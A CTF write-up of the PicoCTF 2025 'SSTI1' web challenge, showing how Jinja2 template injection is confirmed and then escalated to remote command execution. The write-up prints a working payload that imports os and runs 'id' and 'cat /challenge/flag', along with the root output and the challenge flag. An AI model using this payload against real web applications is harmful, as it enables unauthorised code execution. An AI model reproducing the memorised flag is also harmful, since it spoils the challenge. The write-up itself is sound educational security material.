# 🧠 Challenge: SSTI1 — Server-Side Template Injection

**Category:** Web Exploitation  
**CTF:** PicoCTF 2025  
**Flag:** `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_3066c7bd}`

---

## 📝 Description

> I made a cool website where you can announce whatever you want! Try it out!  
>  
> Additional details will be available after launching your challenge instance.

After launching the challenge, a simple input form appeared on the webpage, where whatever text we entered was displayed back — a potential sign of **unsanitized server-side rendering**.

---

## 🔍 Observations

There was a `type` input field where anything we typed was reflected directly in the page output. This hinted at a possible **Server-Side Template Injection (SSTI)** vulnerability.

The hint provided with the challenge also explicitly mentioned:

> **Hint:** Server Side Template Injection

---

## ✅ Step 1: Confirming SSTI

To confirm SSTI, I used a basic template expression:

```jinja2
{{7*7}}
```

The response was:
`49`

This confirmed that the server was evaluating the input as code using a template engine (most likely Jinja2 in Python).

## 🧨 Step 2: Testing Command Execution

Now that SSTI was confirmed, I attempted to execute an OS command using a known Jinja2 SSTI payload:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

```
The server returned:

```
uid=0(root) gid=0(root) groups=0(root)
```

This verified that arbitrary command execution was possible on the server.

## 🏁 Step 3: Retrieving the Flag

To read the flag file, I modified the payload:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /challenge/flag').read() }}

```

And the server returned:

`picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_3066c7bd}`

## 🏴 Final Flag

`picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_3066c7bd}`

## 🛠️ Tools & Techniques Used

    Jinja2 SSTI payloads

    Browser dev tools

    Template injection exploitation methodology

    Knowledge of Python's built-in object tree

## 📚 References

    PayloadsAllTheThings - SSTI

    HackTricks - SSTI Exploitation

## ⚠️ Disclaimer

This writeup is for educational purposes only. Always follow ethical hacking principles and never exploit systems without permission.





